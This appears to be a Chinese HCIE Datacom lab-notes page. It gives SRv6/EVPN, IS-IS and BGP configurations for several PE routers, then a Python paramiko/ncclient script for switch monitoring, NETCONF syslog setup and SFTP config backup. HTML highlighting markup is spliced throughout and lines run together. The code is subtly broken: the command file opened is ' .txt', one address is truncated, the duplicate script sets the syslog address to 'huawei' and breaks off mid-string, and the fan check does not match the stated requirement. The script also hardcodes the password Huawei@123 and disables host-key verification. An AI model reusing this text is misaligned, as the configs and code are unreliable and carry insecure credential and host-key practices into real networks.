encap-type srv6  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.2.1 as-number 65003    peer 10.20.2.1 route-policy oa_med <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.2.5 as-number 65003    peer 10.20.2.5 route-policy rd_med <span class="hljs-built_in">export</span>    quit  quit5. Y_PE2bfd  sbfd  reflector discriminator 4.0.0.4  destination ipv6 fc00::6 remote-discriminator 6.0.0.6  quitte ipv6-router-id fc00::4segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address fc00::4    locator HCIE ipv6-prefix fc02:4:: 96 static 16    opcode ::1 end psp    opcode ::10 end-x interface ethernet 3/0/0 nexthop fc01:10::19 psp    opcode ::20 end-x interface ethernet 3/0/1 nexthop fc01:10::D psp    opcode ::30 end-x interface ethernet 3/0/2 nexthop fc01:10::1E psp    opcode ::100 end-op    quit    srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy locator HCIE  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50  segment-list y2-z2-zhu    index 10 sid ipv6 fc02:4::30  segment-list y2-z2-bei    index 10 sid ipv6 fc02:4::10    index 20 sid ipv6 fc02:3::30    index 30 sid ipv6 fc02:6::10    quit    srv6-te policy y2-z2 endpoint fc00::6 color 104    candidate-path preference 200      segment-list y2-z2-zhu    candidate-path preference 100      segment-list y2-z2-bei      quit    quit  quitroute-policy fz1 permit node 10  apply cost 10route-policy fz2 permit node 10  apply extcommunity color 0:104route-policy oa_med permit node 10  apply cost 12route-policy rd_med permit node 10  apply cost 10  quittunnel-policy y2-z2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1  quitip vpn-instance OA  route-distinguisher 65003:2  vpn-target 3:4 export-extcommunity evpn  vpn-target 4:3 import-extcommunity evpn  tnl-policy y2-z2 evpnip vpn-instance R&amp;D  route-distinguisher 65003:4  vpn-target 33:44 export-extcommunity evpn  vpn-target 44:33 import-extcommunity evpn  tnl-policy y2-z2 evpn  quitinterface ethernet 3/0/7.10  vlan <span class="hljs-keyword">do</span> 10  ip binding vpn-instance OA  ip add 10.20.2.10 30interface ethernet 3/0/7.20  vlan <span class="hljs-keyword">do</span> 20  ip binding vpn-instance R&amp;D  ip add 10.20.2.14 30  quitisis 1   is-level level-2  cost-style wide  network-entity 49.0001.0040.0000.0004.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 300 min-rx-interval 300  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2    quit  quitint lo0  isis ipv6 <span class="hljs-built_in">enable</span> 1int ethernet 3/0/1  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/2  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/0  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis cost 4  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123  quitbgp 65000  router-id 4.0.0.4  peer fc00::5 as-number 65000  peer fc00::5 password cipher Huawei@123  peer fc00::5 connect-interface loopback 0  peer fc00::6 as-number 65000  peer fc00::6 password cipher Huawei@123  peer fc00::6 connect-interface loopback 0  l2vpn-family evpn    peer fc00::5 <span class="hljs-built_in">enable</span>    y    peer fc00::5 route-policy fz1 import    peer fc00::5 advertise encap-type srv6    peer fc00::6 <span class="hljs-built_in">enable</span>    y    peer fc00::6 route-policy fz2 import    peer fc00::6 advertise encap-type srv6  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.2.9 as-number 65003    peer 10.20.2.9 route-policy oa_med <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.2.13 as-number 65003    peer 10.20.2.13 route-policy rd_med <span class="hljs-built_in">export</span>    quit  quit  6. Z_PE1bfd  sbfd  reflector discriminator 5.0.0.5  destination ipv6 fc00::1 remote-discriminator 1.0.0.1  destination ipv6 fc00::3 remote-discriminator 3.0.0.3  quitte ipv6-router-id fc00::5segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address fc00::5    locator HCIE ipv6-prefix fc02:5:: 96 static 16    opcode ::1 end psp    opcode ::10 end-x interface ethernet 3/0/0 nexthop fc01:10::22 psp    opcode ::20 end-x interface ethernet 3/0/1 nexthop fc01:10::5 psp    opcode ::30 end-x interface ethernet 3/0/2 nexthop fc01:10::15 psp    opcode ::100 end-op    quit    srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy locator HCIE  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50  segment-list z1-x1-zhu    index 10 sid ipv6 fc02:5::20  segment-list z1-x1-bei    index 10 sid ipv6 fc02:5::10    index 20 sid ipv6 fc02:6::20    index 30 sid ipv6 fc02:2::10    quit    srv6-te policy z1-x1 endpoint fc00::1 color 101    candidate-path preference 200      segment-list z1-x1-zhu    candidate-path preference 100      segment-list z1-x1-bei      quit    quit      segment-list z1-y1-zhu    index 10 sid ipv6 fc02:5::30  segment-list z1-y1-bei    index 10 sid ipv6 fc02:5::10    index 20 sid ipv6 fc02:6::20    index 30 sid ipv6 fc02:4::10    quit    srv6-te policy z1-y1 endpoint fc00::3 color 103    candidate-path preference 200      segment-list z1-y1-zhu    candidate-path preference 100      segment-list z1-y1-bei      quit    quit  quitroute-policy fx1 permit node 10  apply extcommunity color 0:101route-policy fx2 permit node 10  apply cost 10route-policy fy1 permit node 10  apply extcommunity color 0:103route-policy fy2 permit node 10  apply cost 10route-policy oa_med permit node 10  apply cost 10route-policy rd_med permit node 10  apply cost 12  quittunnel-policy z1-xy1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1  quitip vpn-instance OA  route-distinguisher 65004:1  vpn-target 4:1 export-extcommunity evpn  vpn-target 1:4 import-extcommunity evpn  vpn-target 4:3 export-extcommunity evpn  vpn-target 3:4 import-extcommunity evpn  tnl-policy z1-xy1 evpnip vpn-instance R&amp;D  route-distinguisher 65004:3  vpn-target 44:33 export-extcommunity evpn  vpn-target 33:44 import-extcommunity evpn  tnl-policy z1-xy1 evpn  quitinterface ethernet 3/0/7.10  vlan <span class="hljs-keyword">do</span> 10  ip binding vpn-instance OA  ip add 10.20.3.2 30interface ethernet 3/0/7.20  vlan <span class="hljs-keyword">do</span> 20  ip binding vpn-instance R&amp;D  ip add 10.20.3.6 30  quitisis 1   is-level level-2  cost-style wide  network-entity 49.0001.0050.0000.0005.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 300 min-rx-interval 300  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2    quit  quitint lo0  isis ipv6 <span class="hljs-built_in">enable</span> 1int ethernet 3/0/1  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/2  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/0  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis cost 4  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123  quitbgp 65000  router-id 5.0.0.5  peer fc00::1 as-number 65000  peer fc00::1 password cipher Huawei@123  peer fc00::1 connect-interface loopback 0  peer fc00::2 as-number 65000  peer fc00::2 password cipher Huawei@123  peer fc00::2 connect-interface loopback 0  peer fc00::3 as-number 65000  peer fc00::3 password cipher Huawei@123  peer fc00::3 connect-interface loopback 0  peer fc00::4 as-number 65000  peer fc00::4 password cipher Huawei@123  peer fc00::4 connect-interface loopback 0  l2vpn-family evpn    peer fc00::1 <span class="hljs-built_in">enable</span>    y    peer fc00::1 route-policy fx1 import    peer fc00::1 advertise encap-type srv6    peer fc00::2 <span class="hljs-built_in">enable</span>    y    peer fc00::2 route-policy fx2 import    peer fc00::2 advertise encap-type srv6    peer fc00::3 <span class="hljs-built_in">enable</span>    y    peer fc00::3 route-policy fy1 import    peer fc00::3 advertise encap-type srv6    peer fc00::4 <span class="hljs-built_in">enable</span>    y    peer fc00::4 route-policy fy2 import    peer fc00::4 advertise encap-type srv6  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.3.1 as-number 65004    peer 10.20.3.1 route-policy oa_med <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.3.5 as-number 65004    peer 10.20.3.5 route-policy rd_med <span class="hljs-built_in">export</span>    quit  quit7. Z_PE2bfd  sbfd  reflector discriminator 6.0.0.6  destination ipv6 fc00::2 remote-discriminator 2.0.0.2  destination ipv6 fc00::4 remote-discriminator 4.0.0.4  quitte ipv6-router-id fc00::6segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address fc00  locator HCIE ipv6-prefix fc02:6:: 96 static 16    opcode ::1 end psp    opcode ::10 end-x interface ethernet 3/0/0 nexthop fc01:10::21 psp    opcode ::20 end-x interface ethernet 3/0/1 nexthop fc01:10::11 psp    opcode ::30 end-x interface ethernet 3/0/2 nexthop fc01:10::1D psp    opcode ::100 end-op    quit    srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy locator HCIE  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50  segment-list z2-x2-zhu    index 10 sid ipv6 fc02:6::20  segment-list z2-x2-bei    index 10 sid ipv6 fc02:6::10    index 20 sid ipv6 fc02:5::20    index 30 sid ipv6 fc02:1::10    quit    srv6-te policy z2-x2 endpoint fc00::2 color 102    candidate-path preference 200      segment-list z2-x2-zhu    candidate-path preference 100      segment-list z2-x2-bei      quit    quit      segment-list z2-y2-zhu    index 10 sid ipv6 fc02:6::30  segment-list z2-y2-bei    index 10 sid ipv6 fc02:6::10    index 20 sid ipv6 fc02:5::20    index 30 sid ipv6 fc02:3::10    quit    srv6-te policy z2-y2 endpoint fc00::4 color 104    candidate-path preference 200      segment-list z2-y2-zhu    candidate-path preference 100      segment-list z2-y2-bei      quit    quit  quitroute-policy fx1 permit node 10  apply cost 10route-policy fx2 permit node 10  apply extcommunity color 0:102route-policy fy1 permit node 10  apply cost 10route-policy fy2 permit node 10  apply extcommunity color 0:104route-policy oa_med permit node 10  apply cost 10route-policy rd_med permit node 10  apply cost 12  quittunnel-policy z2-xy2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1  quitip vpn-instance OA  route-distinguisher 65004:2  vpn-target 4:1 export-extcommunity evpn  vpn-target 1:4 import-extcommunity evpn  vpn-target 4:3 export-extcommunity evpn  vpn-target 3:4 import-extcommunity evpn  tnl-policy z2-xy2 evpnip vpn-instance R&amp;D  route-distinguisher 65004:4  vpn-target 44:33 export-extcommunity evpn  vpn-target 33:44 import-extcommunity evpn  tnl-policy z2-xy2 evpn  quitinterface ethernet 3/0/7.10  vlan <span class="hljs-keyword">do</span> 10  ip binding vpn-instance OA  ip add 10.20.3.10 30interface ethernet 3/0/7.20  vlan <span class="hljs-keyword">do</span> 20  ip binding vpn-instance R&amp;D  ip add 10.20.3.14 30  quitisis 1   is-level level-2  cost-style wide  network-entity 49.0001.0060.0000.0006.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 300 min-rx-interval 300  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2    quit  quitint lo0  isis ipv6 <span class="hljs-built_in">enable</span> 1int ethernet 3/0/1  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/2  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123int ethernet 3/0/0  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis cost 4  isis circuit-type p2p  isis ppp-negotiation 2-way  isis authentication-mode md5 plain Huawei@123  quitbgp 65000  router-id 6.0.0.6  peer fc00::1 as-number 65000  peer fc00::1 password cipher Huawei@123  peer fc00::1 connect-interface loopback 0  peer fc00::2 as-number 65000  peer fc00::2 password cipher Huawei@123  peer fc00::2 connect-interface loopback 0  peer fc00::3 as-number 65000  peer fc00::3 password cipher Huawei@123  peer fc00::3 connect-interface loopback 0  peer fc00::4 as-number 65000  peer fc00::4 password cipher Huawei@123  peer fc00::4 connect-interface loopback 0  l2vpn-family evpn    peer fc00::1 <span class="hljs-built_in">enable</span>    y    peer fc00::1 route-policy fx1 import    peer fc00::1 advertise encap-type srv6    peer fc00::2 <span class="hljs-built_in">enable</span>    y    peer fc00::2 route-policy fx2 import    peer fc00::2 advertise encap-type srv6    peer fc00::3 <span class="hljs-built_in">enable</span>    y    peer fc00::3 route-policy fy1 import    peer fc00::3 advertise encap-type srv6    peer fc00::4 <span class="hljs-built_in">enable</span>    y    peer fc00::4 route-policy fy2 import    peer fc00::4 advertise encap-type srv6  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.3.9 as-number 65004    peer 10.20.3.9 route-policy oa_med <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 locator HCIE    segment-routing ipv6 traffic-engineer best-effort evpn    peer 10.20.3.13 as-number 65004    peer 10.20.3.13 route-policy rd_med <span class="hljs-built_in">export</span>    quit  quit8. Z_Exportip vpn-instance OA  route-distinguisher 65004:1ip vpn-instance R&amp;D  route-distinguisher 65004:2  quit  int g 0/0/7  undo portswitchint g 0/0/6  undo portswitch  quit  int lo0  ip binding vpn-instance OA  ip add 10.3.101.254 24int lo1  ip binding vpn-instance R&amp;D  ip add 10.3.99.254 24int lo2  ip binding vpn-instance R&amp;D  ip add 10.3.100.254 24interface G 0/0/7.10  dot1q termination vid 10  ip binding vpn-instance OA  ip add 10.20.3.1 30interface G 0/0/7.20  dot1q termination vid 20  ip binding vpn-instance R&amp;D  ip add 10.20.3.5 30interface G 0/0/6.10  dot1q termination vid 10  ip binding vpn-instance OA  ip add 10.20.3.9 30interface G 0/0/6.20  dot1q termination vid 20  ip binding vpn-instance R&amp;D  ip add 10.20.3.13 30  quit  bgp 65004  router-id 10.3.99.254  ipv4-family vpn-instance OA    network 10.3.101.0 24    peer 10.20.3.2 as-number 65000    peer 10.20.3.10 as-number 65000  ipv4-family vpn-instance R&amp;D    network 10.3.99.0 24    network 10.3.100.0 24    peer 10.20.3.6 as-number 65000    peer 10.20.3.14 as-number 65000    quit  quit9. 其他<span class="hljs-comment"># auto-frr</span>bgp 65000  ipv4-family vpn-instance OA    <span class="hljs-comment"># X/Y_PE1</span>    auto-frr    <span class="hljs-comment"># other PE</span>    undo auto-frr<span class="hljs-comment"># 检查</span>dis isis peerPython网络自动化1、前5个需求1. 5min读取一下 X_T1_AGG1上的关键信息： 电源，风扇，LACP状态，CUP和内存使用率，OSPF邻居状态；2. PC1-X_T1_AGG1之间采用安全的通道进行连接；3. 读取风扇信息，如果两个风扇为Nor（坏掉的意思），则输出“All fans are faultly”；4. 所有监控命令不能固定在代码里面，需要防止文件里面，通过调用文件的方式进行；5. 每24小时自动保存设备的配置文件并备份到本地，并通过安全的传输协议存在本地设备，以【当天日期_设备名字.后续】的名称命名设备端以及本地的配置文件。举例：2022_2_14_X_T2_AGG1.zip 2022_2_14_X_T2_AGG1.bakX_T1_AGG1user-interface vty 0 4  authentication-mode aaa  protocol inbound ssh  user privilege level 15  quitaaa  local-user python password irreversible-cipher Huawei@123  local-user python service-type ssh    local-user python privilege level 15  local-user netconf password irreversible-cipher Huawei@123  local-user netconf service-type api  local-user netconf privilege level 15  local-aaa-user password policy administrator    undo password alert original    quit  quitstelnet server <span class="hljs-built_in">enable</span>ssh server-source all-interfacessh user pythonssh user python authentication-type passwordssh user python service-type stelnetsftp server <span class="hljs-built_in">enable</span>ssh user python service-type allssh user python sftp-directory flash:/netconf  <span class="hljs-built_in">source</span> ip interface loopback 0 port 830  quit2、创建“command.txt”文件，完成1和4需求display powerdisplay fandisplay lacp briefdisplay cpu <span class="hljs-built_in">history</span> 1hourdisplay memory-usagedisplay ospf peer brief3、相关需求的Python程序pip install ncclientpip install paramiko<span class="hljs-comment"># S300交换机 配置日志主机信息</span><span class="hljs-comment"># S300交换机 配置设备时间</span>from paramiko import SSHClient,AutoAddPolicyfrom ncclient import managerfrom ncclient.xml_ import to_elefrom <span class="hljs-keyword">time</span> import <span class="hljs-built_in">sleep</span>from datetime import datetime,timedeltaclass Datacom:    def __init__(self,server,username,password):        self.server=server        self.username=username        self.password=password        self.client=self._get_client()        self.cli=self.client.invoke_shell()        self.cli.send(<span class="hljs-string">&#x27;screen-length 0 temporary\n&#x27;</span>)        <span class="hljs-built_in">sleep</span>(6)        self.cli.recv(9999)    <span class="hljs-comment"># 创建一个SSH连接客户端</span>    def _get_client(self):        client=SSHClient() <span class="hljs-comment"># SSH客户端工具进行实例化</span>        client.load_system_host_keys() <span class="hljs-comment"># 加载SSH的主机公钥</span>        client.set_missing_host_key_policy(AutoAddPolicy) <span class="hljs-comment"># 当本地设备没有公钥时自动保存交换机的SSH公钥</span>        client.connect(self.server,username=self.username,password=self.password) <span class="hljs-comment"># 使用地址，账号和密码进行SSH连接</span>        <span class="hljs-built_in">return</span> client    <span class="hljs-comment"># 发送命令的方法</span>    def <span class="hljs-built_in">command</span>(self,cmd):        self.cli.send(<span class="hljs-string">&#x27;&#123;&#125;\n&#x27;</span>.format(cmd))        <span class="hljs-built_in">sleep</span>(6)        <span class="hljs-built_in">return</span> self.cli.recv(9999).decode() <span class="hljs-comment"># 回到cli函数读取回显结果9999字符，并使用decode进行解码</span>    <span class="hljs-comment"># 检测风扇是否正常</span>    def fan_info(self):        fan_info=self.command(<span class="hljs-string">&#x27;display fan&#x27;</span>)         <span class="hljs-built_in">return</span> fan_info.find(<span class="hljs-string">&#x27;Normal&#x27;</span>)==-1    <span class="hljs-comment"># sftp下载配置文件</span>    def download(self,target,path=<span class="hljs-string">&#x27;/vrpcfg.zip&#x27;</span>):        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;download staring...&#x27;</span>)        client=self._get_client()        sftp=client.open_sftp()        sftp.get(path,target)        self.client.close()        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;download finish.&#x27;</span>)    <span class="hljs-comment"># 关闭连接</span>    def close(self):        self.client.close()<span class="hljs-comment"># 定义使用ncclient并使用netconf方式进行设备配置，并在配置成功后输出成功提示</span>def Netconf_by_rpc(ip,username,password,rpc_netconf):    with manager.connect_ssh(host=ip,                             username=username,                             password=password,                             hostkey_verify=False,                             device_params=&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&quot;huaweiyang&quot;</span>&#125;)  as  m:        <span class="hljs-built_in">command</span>=to_ele(rpc_netconf)        rpc=m.__getattr__(<span class="hljs-string">&quot;rpc&quot;</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;get manager inner function rpc &#123;&#125;&#x27;</span>.format(rpc))        rpc(<span class="hljs-built_in">command</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;netconf setting success!&#x27;</span>)<span class="hljs-comment"># 定义使用netconf的方法进行设置设备日志主机的函数，并输出正在配置日志主机提示</span>def Netconf_syslog_host(ip,username,password,syslog):    rpc_netconf=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&lt;edit-config&gt;</span><span class="hljs-string">    &lt;target&gt;</span><span class="hljs-string">      &lt;running/&gt;</span><span class="hljs-string">    &lt;/target&gt;</span><span class="hljs-string">    &lt;config&gt;</span><span class="hljs-string">      &lt;syslog:syslog xmlns:syslog=&quot;urn:ietf:params:xml:ns:yang:ietf-syslog&quot;&gt;</span><span class="hljs-string">        &lt;syslog:log-actions&gt;</span><span class="hljs-string">          &lt;syslog:remote&gt;</span><span class="hljs-string">            &lt;syslog:destination&gt;</span><span class="hljs-string">              &lt;syslog:name&gt;syslog-host&lt;/syslog:name&gt;</span><span class="hljs-string">              &lt;syslog:udp&gt;</span><span class="hljs-string">                &lt;syslog:address&gt;&#123;&#125;&lt;/syslog:address&gt;</span><span class="hljs-string">                &lt;syslog:port&gt;43&lt;/syslog:port&gt;</span><span class="hljs-string">              &lt;/syslog:udp&gt;</span><span class="hljs-string">              &lt;syslog:destination-facility xmlns:ietf-syslog-types=&quot;urn:ietf:params:xml:ns:yang:ietf-syslog-types&quot;&gt;ietf-syslog-types:local0&lt;/syslog:destination-facility&gt;</span><span class="hljs-string">            &lt;/syslog:destination&gt;</span><span class="hljs-string">          &lt;/syslog:remote&gt;</span><span class="hljs-string">        &lt;/syslog:log-actions&gt;</span><span class="hljs-string">      &lt;/syslog:syslog&gt;</span><span class="hljs-string">    &lt;/config&gt;</span><span class="hljs-string">  &lt;/edit-config&gt;</span><span class="hljs-string">  &#x27;</span><span class="hljs-string">&#x27;&#x27;</span>.format(syslog)    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Using netconf configure syslog...&#x27;</span>)    Netconf_by_rpc(ip,username,password,rpc_netconf)<span class="hljs-comment"># 定义组装函数</span>def datacom_loop(ip,username,password,name):    try:        <span class="hljs-keyword">while</span> True:            datacom=Datacom(ip,username,password)            with open(<span class="hljs-string">&#x27; .txt&#x27;</span>)  as f:             <span class="hljs-keyword">for</span> <span class="hljs-built_in">command</span> <span class="hljs-keyword">in</span> f:                <span class="hljs-built_in">print</span>(datacom.command(<span class="hljs-built_in">command</span>))            <span class="hljs-keyword">if</span> datacom.fan_info(): <span class="hljs-comment"># 判断风扇是否故障</span>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ALL fans are faultly&#x27;</span>)            try:                <span class="hljs-comment"># 开始判断是不是保存配置超过24小时了, 则进行强行赋值，大于一天</span>                than_one_day= datetime.now() - last_downloadtime&gt;=timedelta(days=1)            except NameError:                than_one_day=True            <span class="hljs-keyword">if</span> than_one_day: <span class="hljs-comment"># 开始判断是不是保存配置超过24小时了</span>                downloadtime=datetime.now() <span class="hljs-comment"># 记录下载时间</span>                downloadtime_date=downloadtime.strftime(<span class="hljs-string">&#x27;%Y_%m_%d&#x27;</span>)                config_filename=<span class="hljs-string">&#x27;&#123;&#125;_&#123;&#125;.zip&#x27;</span>.format(downloadtime_date,name) <span class="hljs-comment"># 下载载的文件名字</span>                backup_filename=<span class="hljs-string">&#x27;&#123;&#125;_&#123;&#125;.bak&#x27;</span>.format(downloadtime_date,name) <span class="hljs-comment"># 保存的配置文件名字</span>                datacom.command(<span class="hljs-string">&#x27;save force &#123;&#125;&#x27;</span>.format(config_filename))  <span class="hljs-comment"># 保存文件</span>                datacom.download(backup_filename,config_filename) <span class="hljs-comment"># 下载函数下载文件</span>                last_downloadtime=downloadtime <span class="hljs-comment"># 把最后一次的下载的时间设置成现在</span>                datacom.close()                <span class="hljs-built_in">sleep</span>(5*60) <span class="hljs-comment"># 五分钟之后继续重复以上操作</span>    except Exception as e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stopped by &#123;&#125;&#x27;</span>.format(e))ip = <span class="hljs-string">&#x27;10.1.0.6&#x27;</span> <span class="hljs-comment"># 设备IP地址</span>name = <span class="hljs-string">&#x27;X_T1_AGG1&#x27;</span> <span class="hljs-comment"># 设备名</span>syslog = <span class="hljs-string">&#x27;10.1.60.2&#x27;</span> <span class="hljs-comment"># 日志主机地址</span>username = <span class="hljs-string">&#x27;python&#x27;</span> <span class="hljs-comment"># SSH的用户名</span>password = <span class="hljs-string">&#x27;Huawei@123&#x27;</span> <span class="hljs-comment"># SSH的密码</span>nc_username = <span class="hljs-string">&#x27;netconf&#x27;</span> <span class="hljs-comment"># 用于netconf的用户名</span>nc_password = <span class="hljs-string">&#x27;Huawei@123&#x27;</span> <span class="hljs-comment"># 用于netconf的密码</span><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    try:        Netconf_syslog_host(ip,nc_username,nc_password,syslog)        datacom_loop(ip,username,password,name) <span class="hljs-comment"># 执行巡检调用，进行每5分钟一次的循环</span>    except KeyboardInterrupt:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;end of process!&#x27;</span>)language-pyfrom paramiko import SSHClient, AutoAddPolicyfrom ncclient import managerfrom ncclient.xml_ import to_elefrom <span class="hljs-keyword">time</span> import <span class="hljs-built_in">sleep</span>from datetime import datetime, timedeltaclass Datacom:    def __init__(self, server, username, password):        self.server = server        self.username = username        self.password = password        self.client = self._get_client()        self.cli = self.client.invoke_shell()        self.cli.send(<span class="hljs-string">&#x27;screen-length 0 temporary\n&#x27;</span>)        <span class="hljs-built_in">sleep</span>(6)        self.cli.recv(9999)    def _get_client(self):        client = SSHClient()        client.load_system_host_keys()        client.set_missing_host_key_policy(AutoAddPolicy)        client.connect(self.server, username=self.username, password=self.password)        <span class="hljs-built_in">return</span> client    def <span class="hljs-built_in">command</span>(self, cmd):        self.cli.send(<span class="hljs-string">&#x27;&#123;&#125;\n&#x27;</span>.format(cmd))        <span class="hljs-built_in">sleep</span>(6)        <span class="hljs-built_in">return</span> self.cli.recv(9999).decode()    def fan_info(self):        fan_info = self.command(<span class="hljs-string">&#x27;display fan&#x27;</span>)        <span class="hljs-built_in">return</span> fan_info.find(<span class="hljs-string">&#x27;Normal&#x27;</span>) == -1    def download(self, target, path=<span class="hljs-string">&#x27;/vrpcfg.zip&#x27;</span>):        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;download starting...&#x27;</span>)        client = self._get_client()        sftp = client.open_sftp()        sftp.get(path, target)        self.client.close()        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;download finish!&#x27;</span>)    def close(self):        self.client.close()def Netconf_by_rpc(ip, username, password, rpc_netconf):    with manager.connect_ssh(host=ip,                             username = username,                             password = password,                             hostkey_verify=False,                             device_params=&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&quot;huaweiyang&quot;</span>&#125;)as m:                                <span class="hljs-built_in">command</span> = to_ele(rpc_netconf)                                rpc = m.__getattr__(<span class="hljs-string">&#x27;rpc&#x27;</span>)                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;get manager inner function rpc &#123;&#125;&#x27;</span>.format(rpc));                                rpc(<span class="hljs-built_in">command</span>)                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Netconf setting success!&#x27;</span>)def Netconf_syslog_host(ip, username, password, syslog):    rpc_netconf = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&lt;edit-config&gt;</span><span class="hljs-string">    &lt;target&gt;</span><span class="hljs-string">      &lt;running/&gt;</span><span class="hljs-string">    &lt;/target&gt;</span><span class="hljs-string">    &lt;config&gt;</span><span class="hljs-string">      &lt;syslog:syslog xmlns:syslog=&quot;</span>urn:ietf:params:xml:ns:yang:ietf-syslog<span class="hljs-string">&quot;&gt;</span><span class="hljs-string">        &lt;syslog:log-actions&gt;</span><span class="hljs-string">          &lt;syslog:remote&gt;</span><span class="hljs-string">            &lt;syslog:destination&gt;</span><span class="hljs-string">              &lt;syslog:name&gt;syslog-host&lt;/syslog:name&gt;</span><span class="hljs-string">              &lt;syslog:udp&gt;</span><span class="hljs-string">                &lt;syslog:address&gt;huawei&lt;/syslog:address&gt;</span><span class="hljs-string">                &lt;syslog:port&gt;43&lt;/syslog:port&gt;</span><span class="hljs-string">              &lt;/syslog:udp&gt;</span><span class="hljs-string">              &lt;syslog:destination-facility xmlns:ietf-syslog-types=&quot;</span>urn:ietf:params:xml:ns:yang:ietf-syslog-types<span class="hljs-string">&quot;&gt;ietf-syslog-types:local0&lt;/syslog:destination-facility&gt;</span><span class="hljs-string">            &lt;/syslog:destination&gt;</span><span class="hljs-string">          &lt;/syslog:remote&gt;</span><span class="hljs-string">        &lt;/syslog:log-actions&gt;</span><span class="hljs-string">      &lt;/syslog:syslog&gt;</span><span class="hljs-string">    &lt;/config&gt;</span><span class="hljs-string">  &lt;/edit-config&gt;&quot;</span><span 